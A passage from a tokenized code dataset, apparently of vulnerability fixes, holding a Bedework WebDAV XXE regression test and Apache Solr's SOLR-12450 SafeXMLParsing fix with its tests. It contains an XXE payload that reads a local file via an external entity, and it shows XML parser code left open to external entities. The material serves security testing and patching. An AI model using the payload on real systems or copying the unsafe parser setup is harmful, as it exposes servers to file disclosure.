".", "CALLS_REAL_METHODS", ")", "private", "MethodBase", "methodBase", ";", "private", "PostRequestPars", "requestPars", ";", "@", "Before", "public", "void", "setup", "(", ")", "throws", "WebdavException", ",", "IOException", "{", "when", "(", "request", ".", "getContentType", "(", "))", ".", "thenReturn", "(", "\"", "application", "/", "xml", "\"", ");", "requestPars", "=", "new", "PostRequestPars", "(", "request", ",", "webdavNsIntf", ",", "UUID", ".", "randomUUID", "(", ").", "toString", "(", "))", ";", "when", "(", "methodBase", ".", "getNsIntf", "(", "))", ".", "thenReturn", "(", "webdavNsIntf", ")", ";", "when", "(", "request", ".", "getContentLength", "(", "))", ".", "thenReturn", "(", "1", ")", ";", "when", "(", "request", ".", "getReader", "(", "))", ".", "thenReturn", "(", "getResource", "(", "\"/", "malicious", "-", "request", ".", "xml", "\"", "))", ";", "}", "@", "Test", "public", "void", "testPostRequestParsWithMaliciousRequest", "(", ")", "throws", "WebdavException", "{", "assertTrue", "(", "requestPars", ".", "processXml", "(", "))", ";", "}", "@", "Test", "public", "void", "testMethodBaseWithMaliciousRequest", "(", ")", "throws", "WebdavException", "{", "assertNotNull", "(", "methodBase", ".", "parseContent", "(", "request", ",", "response", ")", ");", "}", "private", "BufferedReader", "getResource", "(", "final", "String", "name", ")", "{", "return", "new", "BufferedReader", "(", "new", "InputStreamReader", "(", "this", ".", "getClass", "(", ").", "getResourceAsStream", "(", "name", ")", ")", ")", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "12", "@", "@", "<", "?", "xml", "version", "=", "\"", "1", ".", "0", "\"", "encoding", "=", "\"", "UTF", "-", "8", "\"", "?>", "<", "!", "DOCTYPE", "invite", "-", "reply", "[", "<", "!", "ENTITY", "xxe", "SYSTEM", "\"", "file", ":", "//", "/", "xxe", "\"", ">", "]", ">", "<", "A", ":", "invite", "-", "reply", "xmlns", ":", "A", "=", "\"", "http", ":", "//", "calendarserver", ".", "org", "/", "ns", "/", "\"", "xmlns", ":", "B", "=", "\"", "DAV", ":", "\">", "<", "A", ":", "invite", "-", "accepted", ">", "&", "xxe", ";", "</", "A", ":", "invite", "-", "accepted", ">", "<", "B", ":", "href", ">", "/", "some", "/", "url", "<", "/", "B", ":", "href", ">", "<", "A", ":", "in", "-", "reply", "-", "to", ">", "something", "<", "/", "A", ":", "in", "-", "reply", "-", "to", ">", "<", "A", ":", "hosturl", ">", "<", "B", ":", "href", ">", "/<", "/", "B", ":", "href", ">", "<", "/", "A", ":", "hosturl", ">", "<", "/", "A", ":", "invite", "-", "reply", "></s><", "orderEntry", "type", "=", "\"", "library", "\"", "name", "=", "\"", "Maven", ":", "junit", ":", "junit", ":", "4", ".", "8", ".", "2", "\"", "level", "=", "\"", "project", "\"", "/", ">", "public", "abstract", "class", "MethodBase", "extends", "Logged", "{", "*", "@", "param", "len", "Content", "length", "*", "@", "param", "rdr", "Reader", "protected", "Document", "parseContent", "(", "final", "int", "len", ",", "final", "Reader", "rdr", ")", "throws", "WebdavException", "{", "if", "(", "len", "=", "=", "0", ")", "{", "return", "null", ";", "}", "if", "(", "rdr", "=", "=", "null", ")", "{", "/", "/", "No", "content", "?", "return", "null", ";", "}", "try", "{", "DocumentBuilderFactory", "factory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "factory", ".", "setNamespaceAware", "(", "true", ")", ";", "DocumentBuilder", "builder", "=", "factory", ".", "newDocumentBuilder", "(", ");", "return", "builder", ".", "parse", "(", "new", "InputSource", "(", "rdr", ")", ");", "}", "catch", "(", "SAXException", "e", ")", "{", "throw", "new", "WebdavBadRequest", "(", ");", "}", "catch", "(", "Throwable", "t", ")", "{", "throw", "new", "WebdavException", "(", "t", ")", ";", "}", "import", "org", ".", "bedework", ".", "webdav", ".", "servlet", ".", "shared", ".", "WebdavBadRequest", ";", "import", "org", ".", "xml", ".", "sax", ".", "InputSource", ";", "import", "org", ".", "xml", ".", "sax", ".", "SAXException", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "DocumentBuilder", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "DocumentBuilderFactory", ";", "public", "class", "PostRequestPars", "{", "xmlDoc", "=", "parseXml", "(", "reqRdr", ")", ";", "/", "**", "*", "@", "param", "rdr", "for", "xml", "content", "*", "@", "return", "parsed", "Document", "*", "@", "throws", "WebdavException", "*", "/", "private", "Document", "parseXml", "(", "final", "Reader", "rdr", ")", "throws", "WebdavException", "{", "if", "(", "rdr", "=", "=", "null", ")", "{", "return", "null", ";", "}", "try", "{", "final", "DocumentBuilderFactory", "factory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "factory", ".", "setNamespaceAware", "(", "true", ")", ";", "final", "DocumentBuilder", "builder", "=", "factory", ".", "newDocumentBuilder", "(", ");", "return", "builder", ".", "parse", "(", "new", "InputSource", "(", "rdr", ")", ");", "}", "catch", "(", "final", "SAXException", "e", ")", "{", "throw", "new", "WebdavBadRequest", "(", ");", "}", "catch", "(", "final", "Throwable", "t", ")", "{", "throw", "new", "WebdavException", "(", "t", ")", ";", "}", "}"], "docstring_tokens": ["persuading", "a", "victim", "to", "open", "a", "specially-crafted", "file"]}
{"contents": ["empty"], "code_tokens": ["=", "==", "==", "==", "==", "==", "==", "==", "==", "=", "6", ".", "6", ".", "5", "=", "==", "==", "==", "==", "==", "==", "==", "==", "=", "Consult", "the", "LUCENE_CHANGES", ".", "txt", "file", "for", "additional", ",", "low", "level", ",", "changes", "in", "this", "release", ".", "Versions", "of", "Major", "Components", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "Apache", "Tika", "1", ".", "13", "Carrot2", "3", ".", "15", ".", "0", "Velocity", "1", ".", "7", "and", "Velocity", "Tools", "2", ".", "0", "Apache", "UIMA", "2", ".", "3", ".", "1", "Apache", "ZooKeeper", "3", ".", "4", ".", "10", "Jetty", "9", ".", "3", ".", "14", ".", "v20161028", "Bug", "Fixes", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-", "*", "SOLR", "-", "12450", ":", "Don", "'", "t", "allow", "referal", "to", "external", "resources", "in", "various", "config", "files", ".", "(", "Yuyang", "Xiao", ",", "Uwe", "Schindler", ")", "import", "java", ".", "lang", ".", "invoke", ".", "MethodHandles", ";", "import", "org", ".", "apache", ".", "solr", ".", "util", ".", "SafeXMLParsing", ";", "import", "org", ".", "slf4j", ".", "Logger", ";", "import", "org", ".", "slf4j", ".", "LoggerFactory", ";", "private", "static", "final", "Logger", "log", "=", "LoggerFactory", ".", "getLogger", "(", "MethodHandles", ".", "lookup", "(", ").", "lookupClass", "(", "))", ";", "return", "SafeXMLParsing", ".", "parseConfigXML", "(", "log", ",", "resourceLoader", ",", "parseContextConfigLoc", ")", ";", "import", "javax", ".", "xml", ".", "xpath", ".", "XPath", ";", "import", "javax", ".", "xml", ".", "xpath", ".", "XPathConstants", ";", "import", "javax", ".", "xml", ".", "xpath", ".", "XPathExpressionException", ";", "import", "javax", ".", "xml", ".", "xpath", ".", "XPathFactory", ";", "import", "org", ".", "apache", ".", "solr", ".", "util", ".", "SafeXMLParsing", ";", "log", ".", "debug", "(", "\"", "Reloading", "exchange", "rates", "from", "file", "{", "}\"", ",", "currencyConfigFile", ")", ";", "Document", "doc", "=", "SafeXMLParsing", ".", "parseConfigXML", "(", "log", ",", "loader", ",", "currencyConfigFile", ")", ";", "XPathFactory", "xpathFactory", "=", "XPathFactory", ".", "newInstance", "(", ");", "XPath", "xpath", "=", "xpathFactory", ".", "newXPath", "(", ");", "/", "/", "Parse", "exchange", "rates", ".", "NodeList", "nodes", "=", "(", "NodeList", ")", "xpath", ".", "evaluate", "(", "\"/", "currencyConfig", "/", "rates", "/", "rate", "\"", ",", "doc", ",", "XPathConstants", ".", "NODESET", ")", ";", "for", "(", "int", "i", "=", "0", ";", "i", "<", "nodes", ".", "getLength", "(", ");", "i", "+", "+)", "{", "Node", "rateNode", "=", "nodes", ".", "item", "(", "i", ")", ";", "NamedNodeMap", "attributes", "=", "rateNode", ".", "getAttributes", "(", ");", "Node", "from", "=", "attributes", ".", "getNamedItem", "(", "\"", "from", "\"", ");", "Node", "to", "=", "attributes", ".", "getNamedItem", "(", "\"", "to", "\"", ");", "Node", "rate", "=", "attributes", ".", "getNamedItem", "(", "\"", "rate", "\"", ");", "if", "(", "from", "=", "=", "null", "|", "|", "to", "=", "=", "null", "|", "|", "rate", "=", "=", "null", ")", "{", "throw", "new", "SolrException", "(", "SolrException", ".", "ErrorCode", ".", "SERVER_ERROR", ",", "\"", "Exchange", "rate", "missing", "attributes", "(", "required", ":", "from", ",", "to", ",", "rate", ")", "\"", "+", "rateNode", ")", ";", "}", "String", "fromCurrency", "=", "from", ".", "getNodeValue", "(", ");", "String", "toCurrency", "=", "to", ".", "getNodeValue", "(", ");", "Double", "exchangeRate", ";", "if", "(", "null", "=", "=", "CurrencyFieldType", ".", "getCurrency", "(", "fromCurrency", ")", ")", "{", "throw", "new", "SolrException", "(", "SolrException", ".", "ErrorCode", ".", "SERVER_ERROR", ",", "\"", "Specified", "'", "from", "'", "currency", "not", "supported", "in", "this", "JVM", ":", "\"", "+", "fromCurrency", ")", ";", "if", "(", "null", "=", "=", "CurrencyFieldType", ".", "getCurrency", "(", "toCurrency", ")", ")", "{", "throw", "new", "SolrException", "(", "SolrException", ".", "ErrorCode", ".", "SERVER_ERROR", ",", "\"", "Specified", "'", "to", "'", "currency", "not", "supported", "in", "this", "JVM", ":", "\"", "+", "toCurrency", ")", ";", "}", "try", "{", "exchangeRate", "=", "Double", ".", "parseDouble", "(", "rate", ".", "getNodeValue", "(", "))", ";", "}", "catch", "(", "NumberFormatException", "e", ")", "{", "throw", "new", "SolrException", "(", "SolrException", ".", "ErrorCode", ".", "SERVER_ERROR", ",", "\"", "Could", "not", "parse", "exchange", "rate", ":", "\"", "+", "rateNode", ",", "e", ")", ";", "addRate", "(", "tmpRates", ",", "fromCurrency", ",", "toCurrency", ",", "exchangeRate", ")", ";", "}", "catch", "(", "SAXException", "|", "IOException", "|", "XPathExpressionException", "e", ")", "{", "throw", "new", "SolrException", "(", "SolrException", ".", "ErrorCode", ".", "SERVER_ERROR", ",", "\"", "Error", "while", "parsing", "currency", "configuration", "file", "\"", "+", "currencyConfigFile", ",", "e", ")", ";", "/", "*", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "solr", ".", "util", ";", "import", "java", ".", "io", ".", "FilterReader", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "InputStream", ";", "import", "java", ".", "io", ".", "Reader", ";", "import", "java", ".", "io", ".", "StringReader", ";", "import", "javax", ".", "xml", ".", "XMLConstants", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "DocumentBuilder", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "DocumentBuilderFactory", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "ParserConfigurationException", ";", "import", "org", ".", "apache", ".", "commons", ".", "io", ".", "input", ".", "CloseShieldInputStream", ";", "import", "org", ".", "apache", ".", "lucene", ".", "analysis", ".", "util", ".", "ResourceLoader", ";", "import", "org", ".", "apache", ".", "solr", ".", "common", ".", "EmptyEntityResolver", ";", "import", "org", ".", "apache", ".", "solr", ".", "common", ".", "SolrException", ";", "import", "org", ".", "apache", ".", "solr", ".", "common", ".", "util", ".", "SuppressForbidden", ";", "import", "org", ".", "apache", ".", "solr", ".", "common", ".", "util", ".", "XMLErrorLogger", ";", "import", "org", ".", "slf4j", ".", "Logger", ";", "import", "org", ".", "w3c", ".", "dom", ".", "Document", ";", "import", "org", ".", "xml", ".", "sax", ".", "InputSource", ";", "import", "org", ".", "xml", ".", "sax", ".", "SAXException", ";", "/", "**", "*", "Some", "utility", "methods", "for", "parsing", "XML", "in", "a", "safe", "way", ".", "This", "class", "can", "be", "used", "to", "parse", "XML", "*", "coming", "from", "network", "(", "completely", "untrusted", ")", "or", "it", "can", "load", "a", "config", "file", "from", "a", "*", "{", "@", "link", "ResourceLoader", "}", ".", "In", "this", "case", "it", "allows", "external", "entities", "and", "xincludes", ",", "but", "only", "*", "referring", "to", "files", "reachable", "by", "the", "loader", ".", "*", "/", "@", "SuppressForbidden", "(", "reason", "=", "\"", "This", "class", "uses", "XML", "APIs", "directly", "that", "should", "not", "be", "used", "anywhere", "else", "in", "Solr", "code", "\"", ")", "public", "final", "class", "SafeXMLParsing", "{", "public", "static", "final", "String", "SYSTEMID_UNTRUSTED", "=", "\"", "untrusted", ":", "//", "stream", "\"", ";", "private", "SafeXMLParsing", "(", ")", "{", "}", "/", "**", "Parses", "a", "config", "file", "from", "ResourceLoader", ".", "Xinclude", "and", "external", "entities", "are", "enabled", ",", "but", "cannot", "escape", "the", "resource", "loader", ".", "*", "/", "public", "static", "Document", "parseConfigXML", "(", "Logger", "log", ",", "ResourceLoader", "loader", ",", "String", "file", ")", "throws", "SAXException", ",", "IOException", "{", "try", "(", "InputStream", "in", "=", "loader", ".", "openResource", "(", "file", ")", ")", "{", "final", "DocumentBuilderFactory", "dbf", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "dbf", ".", "setValidating", "(", "false", ")", ";", "dbf", ".", "setNamespaceAware", "(", "true", ")", ";", "trySetDOMFeature", "(", "dbf", ",", "XMLConstants", ".", "FEATURE_SECURE_PROCESSING", ",", "true", ")", ";", "try", "{", "dbf", ".", "setXIncludeAware", "(", "true", ")", ";", "}", "catch", "(", "UnsupportedOperationException", "e", ")", "{", "throw", "new", "SolrException", "(", "SolrException", ".", "ErrorCode", ".", "BAD_REQUEST", ",", "\"", "XML", "parser", "doesn", "'", "t", "support", "XInclude", "option", "\"", ",", "e", ")", ";", "}", "final", "DocumentBuilder", "db", "=", "dbf", ".", "newDocumentBuilder", "(", ");", "db", ".", "setEntityResolver", "(", "new", "SystemIdResolver", "(", "loader", ")", ");", "db", ".", "setErrorHandler", "(", "new", "XMLErrorLogger", "(", "log", ")", ");", "return", "db", ".", "parse", "(", "in", ",", "SystemIdResolver", ".", "createSystemIdFromResourceName", "(", "file", ")", ");", "}", "catch", "(", "ParserConfigurationException", "pce", ")", "{", "throw", "new", "SolrException", "(", "SolrException", ".", "ErrorCode", ".", "BAD_REQUEST", ",", "\"", "XML", "parser", "cannot", "be", "configured", "\"", ",", "pce", ")", ";", "}", "}", "/", "**", "Parses", "the", "given", "InputStream", "as", "XML", ",", "disabling", "any", "external", "entities", "with", "secure", "processing", "enabled", ".", "*", "The", "given", "InputStream", "is", "not", "closed", ".", "*", "/", "public", "static", "Document", "parseUntrustedXML", "(", "Logger", "log", ",", "InputStream", "in", ")", "throws", "SAXException", ",", "IOException", "{", "return", "getUntrustedDocumentBuilder", "(", "log", ")", ".", "parse", "(", "new", "CloseShieldInputStream", "(", "in", ")", ",", "SYSTEMID_UNTRUSTED", ")", ";", "}", "/", "**", "Parses", "the", "given", "InputStream", "as", "XML", ",", "disabling", "any", "external", "entities", "with", "secure", "processing", "enabled", ".", "*", "The", "given", "Reader", "is", "not", "closed", ".", "*", "/", "public", "static", "Document", "parseUntrustedXML", "(", "Logger", "log", ",", "Reader", "reader", ")", "throws", "SAXException", ",", "IOException", "{", "final", "InputSource", "is", "=", "new", "InputSource", "(", "new", "FilterReader", "(", "reader", ")", "{", "@", "Override", "public", "void", "close", "(", ")", "{", "}", "}", ");", "is", ".", "setSystemId", "(", "SYSTEMID_UNTRUSTED", ")", ";", "return", "getUntrustedDocumentBuilder", "(", "log", ")", ".", "parse", "(", "is", ")", ";", "}", "public", "static", "Document", "parseUntrustedXML", "(", "Logger", "log", ",", "String", "xml", ")", "throws", "SAXException", ",", "IOException", "{", "return", "parseUntrustedXML", "(", "log", ",", "new", "StringReader", "(", "xml", ")", ");", "}", "private", "static", "DocumentBuilder", "getUntrustedDocumentBuilder", "(", "Logger", "log", ")", "{", "try", "{", "final", "DocumentBuilderFactory", "dbf", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "dbf", ".", "setValidating", "(", "false", ")", ";", "dbf", ".", "setNamespaceAware", "(", "true", ")", ";", "trySetDOMFeature", "(", "dbf", ",", "XMLConstants", ".", "FEATURE_SECURE_PROCESSING", ",", "true", ")", ";", "final", "DocumentBuilder", "db", "=", "dbf", ".", "newDocumentBuilder", "(", ");", "db", ".", "setEntityResolver", "(", "EmptyEntityResolver", ".", "SAX_INSTANCE", ")", ";", "db", ".", "setErrorHandler", "(", "new", "XMLErrorLogger", "(", "log", ")", ");", "return", "db", ";", "}", "catch", "(", "ParserConfigurationException", "pce", ")", "{", "throw", "new", "SolrException", "(", "SolrException", ".", "ErrorCode", ".", "BAD_REQUEST", ",", "\"", "XML", "parser", "cannot", "be", "configured", "\"", ",", "pce", ")", ";", "}", "}", "private", "static", "void", "trySetDOMFeature", "(", "DocumentBuilderFactory", "factory", ",", "String", "feature", ",", "boolean", "enabled", ")", "{", "try", "{", "factory", ".", "setFeature", "(", "feature", ",", "enabled", ")", ";", "}", "catch", "(", "Exception", "ex", ")", "{", "/", "/", "ignore", "}", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "99", "@", "@", "/", "*", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "solr", ".", "util", ";", "import", "java", ".", "io", ".", "ByteArrayInputStream", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "InputStream", ";", "import", "java", ".", "lang", ".", "invoke", ".", "MethodHandles", ";", "import", "java", ".", "nio", ".", "charset", ".", "StandardCharsets", ";", "import", "org", ".", "apache", ".", "lucene", ".", "analysis", ".", "util", ".", "ResourceLoader", ";", "import", "org", ".", "apache", ".", "lucene", ".", "util", ".", "LuceneTestCase", ";", "import", "org", ".", "slf4j", ".", "Logger", ";", "import", "org", ".", "slf4j", ".", "LoggerFactory", ";", "import", "org", ".", "w3c", ".", "dom", ".", "Document", ";", "public", "class", "TestSafeXMLParsing", "extends", "LuceneTestCase", "{", "private", "static", "final", "Logger", "log", "=", "LoggerFactory", ".", "getLogger", "(", "MethodHandles", ".", "lookup", "(", ").", "lookupClass", "(", "))", ";", "public", "void", "testUntrusted", "(", ")", "throws", "Exception", "{", "/", "/", "TODO", ":", "Fix", "the", "underlying", "EmptyEntityResolver", "to", "not", "replace", "external", "entities", "by", "nothing", "and", "instead", "throw", "exception", ":", "Document", "doc", "=", "SafeXMLParsing", ".", "parseUntrustedXML", "(", "log", ",", "\"", "<!", "DOCTYPE", "test", "[", "\\", "n", "\"", "+", "\"", "<!", "ENTITY", "internalTerm", "\\", "\"", "foobar", "\\", "\">", "\\", "n", "\"", "+", "\"", "<!", "ENTITY", "externalTerm", "SYSTEM", "\\", "\"", "foo", ":", "//", "bar", ".", "xyz", "/", "external", "\\", "\">", "\\", "n", "\"", "+", "\"", "]>", "\\", "n", "\"", "+", "\"", "<", "test", ">", "&", "internalTerm", ";", "&", "externalTerm", ";", "</", "test", ">", "\")", ";", "assertEquals", "(", "\"", "foobar", "\"", ",", "doc", ".", "getDocumentElement", "(", ").", "getTextContent", "(", "))", ";", "}", "InputStream", "getStringStream", "(", "String", "xml", ")", "{", "return", "new", "ByteArrayInputStream", "(", "xml", ".", "getBytes", "(", "StandardCharsets", ".", "UTF_8", ")", ");", "}", "public", "void", "testConfig", "(", ")", "throws", "Exception", "{", "final", "ResourceLoader", "loader", "=", "new", "ResourceLoader", "(", ")", "{", "@", "Override", "public", "InputStream", "openResource", "(", "String", "resource", ")", "throws", "IOException", "{", "switch", "(", "resource", ")", "{", "case", "\"", "source1", ".", "xml", "\"", ":", "return", "getStringStream", "(", "\"<", "!", "DOCTYPE", "test", "[", "\\", "n", "\"", "+", "\"", "<!", "ENTITY", "externalTerm", "SYSTEM", "\\", "\"", "foo", ":", "//", "bar", ".", "xyz", "/", "external", "\\", "\">", "\\", "n", "\"", "+", "\"", "]>", "\\", "n", "\"", "+", "\"", "<", "test", ">", "&", "externalTerm", ";", "</", "test", ">", "\")", ";", "case", "\"", "source2", ".", "xml", "\"", ":", "return", "getStringStream", "(", "\"<", "!", "DOCTYPE", "test", "[", "\\", "n", "\"", "+", "\"", "<!", "ENTITY", "externalTerm", "SYSTEM", "\\", "\".", "/", "include1", ".", "xml", "\\", "\">", "\\", "n", "\"", "+", "\"", "]>", "\\", "n", "\"", "+", "\"", "<", "test", ">", "&", "externalTerm", ";", "</", "test", ">", "\")", ";", "case", "\"", "source3", ".", "xml", "\"", ":", "return", "getStringStream", "(", "\"<", "foo", "xmlns", ":", "xi", "=", "\\\"", "http", ":", "//", "www", ".", "w3", ".", "org", "/", "2001", "/", "XInclude", "\\", "\">", "\\", "n", "\"", "+", "\"", "<", "xi", ":", "include", "href", "=", "\\\"", "./", "include2", ".", "xml", "\\", "\"/", ">\\", "n", "\"", "+", "\"", "</", "foo", ">", "\")", ";", "case", "\"", "include1", ".", "xml", "\"", ":", "return", "getStringStream", "(", "\"", "Make", "XML", "Great", "Again", "!", "\u2122\"", ");", "case", "\"", "include2", ".", "xml", "\"", ":", "return", "getStringStream", "(", "\"<", "bar", ">", "Make", "XML", "Great", "Again", "!", "\u2122<", "/", "bar", ">", "\")", ";", "}", "throw", "new", "IOException", "(", "\"", "Resource", "not", "found", ":", "\"", "+", "resource", ")", ";", "}", "@", "Override", "public", "<", "T", ">", "Class", "<", "?", "extends", "T", ">", "findClass", "(", "String", "cname", ",", "Class", "<", "T", ">", "expectedType", ")", "{", "throw", "new", "UnsupportedOperationException", "(", ");", "}", "@", "Override", "public", "<", "T", ">", "T", "newInstance", "(", "String", "cname", ",", "Class", "<", "T", ">", "expectedType", ")", "{", "throw", "new", "UnsupportedOperationException", "(", ");", "}", "}", ";", "IOException", "ioe", "=", "expectThrows", "(", "IOException", ".", "class", ",", "(", ")", "-", ">", "{", "SafeXMLParsing", ".", "parseConfigXML", "(", "log", ",", "loader", ",", "\"", "source1", ".", "xml", "\"", ");", "}", ");", "assertTrue", "(", "ioe", ".", "getMessage", "(", ").", "contains", "(", "\"", "Cannot", "resolve", "absolute", "systemIDs", "\"", "))", ";", "Document", "doc", "=", "SafeXMLParsing", ".", "parseConfigXML", "(", "log", ",", "loader", ",", "\"", "source2", ".", "xml", "\"", ");", "assertEquals", "(", "\"", "Make", "XML", "Great", "Again", "!", "\u2122\"", ",", "doc", ".", "getDocumentElement", "(", ").", "getTextContent", "(", "))", ";", "doc", "=", "SafeXMLParsing", ".", "parseConfigXML", "(", "log", ",", "loader", ",", "\"", "source3", ".", "xml", "\"", ");", "assertEquals", "(", "\"", "Make", "XML", "Great", "Again", "!", "\u2122\"", ",", "doc", ".", "getDocumentElement", "(", ").", "getTextContent", "(", ").", "trim", "(", "))", ";", "}", "}</s>import", "javax", ".", "xml", ".", "parsers", ".", "DocumentBuilderFactory", ";", "import", "java", ".", "io", ".", "InputStream", ";", "try", "(", "InputStream", "in", "=", "resourceLoader", ".", "openResource", "(", "parseContextConfigLoc", ")", ")", "{", "return", "DocumentBuilderFactory", ".", "newInstance", "(", ").", "newDocumentBuilder", "(", ").", "parse", "(", "in", ",", "parseContextConfigLoc", ")", ";", "}", "import", "javax", ".", "xml", ".", "parsers", ".", "DocumentBuilderFactory", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "ParserConfigurationException", ";", "import", "javax", ".", "xml", ".", "xpath", ".", "XPath", ";", "import", "javax", ".", "xml", ".", "xpath", ".", "XPathConstants", ";", "import", "javax", ".", "xml", ".", "xpath", ".", "XPathExpressionException", ";", "import", "javax", ".", "xml", ".", "xpath", ".", "XPathFactory", ";", "import", "java", ".", "io", ".", "InputStream", ";", "InputStream", "is", "=", "null", ";", "log", ".", "debug", "(", "\"", "Reloading", "exchange", "rates", "from", "file", "\"", "+", "this", ".", "currencyConfigFile", ")", ";", "is", "=", "loader", ".", "openResource", "(", "currencyConfigFile", ")", ";", "javax", ".", "xml", ".", "parsers", ".", "DocumentBuilderFactory", "dbf", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "try", "{", "dbf", ".", "setXIncludeAware", "(", "true", ")", ";", "dbf", ".", "setNamespaceAware", "(", "true", ")", ";", "}", "catch", "(", "UnsupportedOperationException", "e", ")", "{", "throw", "new", "SolrException", "(", "SolrException", ".", "ErrorCode", ".", "BAD_REQUEST", ",", "\"", "XML", "parser", "doesn", "'", "t", "support", "XInclude", "option", "\"", ",", "e", ")", ";", "}", "try", "{", "Document", "doc", "=", "dbf", ".", "newDocumentBuilder", "(", ").", "parse", "(", "is", ")", ";", "XPathFactory", "xpathFactory", "=", "XPathFactory", ".", "newInstance", "(", ");", "XPath", "xpath", "=", "xpathFactory", ".", "newXPath", "(", ");", "/", "/", "Parse", "exchange", "rates", ".", "NodeList", "nodes", "=", "(", "NodeList", ")", "xpath", ".", "evaluate", "(", "\"/", "currencyConfig", "/", "rates", "/", "rate", "\"", ",", "doc", ",", "XPathConstants", ".", "NODESET", ")", ";", "for", "(", "int", "i", "=", "0", ";", "i", "<", "nodes", ".", "getLength", "(", ");", "i", "+", "+)", "{", "Node", "rateNode", "=", "nodes", ".", "item", "(", "i", ")", ";", "NamedNodeMap", "attributes", "=", "rateNode", ".", "getAttributes", "(", ");", "Node", "from", "=", "attributes", ".", "getNamedItem", "(", "\"", "from", "\"", ");", "Node", "to", "=", "attributes", ".", "getNamedItem", "(", "\"", "to", "\"", ");", "Node", "rate", "=", "attributes", ".", "getNamedItem", "(", "\"", "rate", "\"", ");", "if", "(", "from", "=", "=", "null", "|", "|", "to", "=", "=", "null", "|", "|", "rate", "=", "=", "null", ")", "{", "throw", "new", "SolrException", "(", "SolrException", ".", "ErrorCode", ".", "SERVER_ERROR", ",", "\"", "Exchange", "rate", "missing", "attributes", "(", "required", ":", "from", ",", "to", ",", "rate", ")", "\"", "+", "rateNode", ")", ";", "}", "String", "fromCurrency", "=", "from", ".", "getNodeValue", "(", ");", "String", "toCurrency", "=", "to", ".", "getNodeValue", "(", ");", "Double", "exchangeRate", ";", "if", "(", "null", "=", "=", "CurrencyFieldType", ".", "getCurrency", "(", "fromCurrency", ")", ")", "{", "throw", "new", "SolrException", "(", "SolrException", ".", "ErrorCode", ".", "SERVER_ERROR", ",", "\"", "Specified", "'", "from", "'", "currency", "not", "supported", "in", "this", "JVM", ":", "\"", "+", "fromCurrency", ")", ";", "}", "if", "(", "null", "=", "=", "CurrencyFieldType", ".", "getCurrency", "(", "toCurrency", ")", ")", "{", "throw", "new", "SolrException", "(", "SolrException", ".", "ErrorCode", ".", "SERVER_ERROR", ",", "\"", "Specified", "'", "to", "'", "currency", "not", "supported", "in", "this", "JVM", ":", "\"", "+", "toCurrency", ")", ";", "}", "try", "{", "exchangeRate", "=", "Double", ".", "parseDouble", "(", "rate", ".", "getNodeValue", "(", "))", ";", "}", "catch", "(", "NumberFormatException", "e", ")", "{", "throw", "new", "SolrException", "(", "SolrException", ".", "ErrorCode", ".", "SERVER_ERROR", ",", "\"", "Could", "not", "parse", "exchange", "rate", ":", "\"", "+", "rateNode", ",", "e", ")", ";", "}", "addRate", "(", "tmpRates", ",", "fromCurrency", ",", "toCurrency", ",", "exchangeRate", ")", ";", "}", "catch", "(", "SAXException", "|", "XPathExpressionException", "|", "ParserConfigurationException", "|", "IOException", "e", ")", "{", "throw", "new", "SolrException", "(", "SolrException", ".", "ErrorCode", ".", "SERVER_ERROR", ",", "\"", "Error", "parsing", "currency", "config", ".", "\",", "e", ")", ";", "}", "}", "catch", "(", "IOException", "e", ")", "{", "throw", "new", "SolrException", 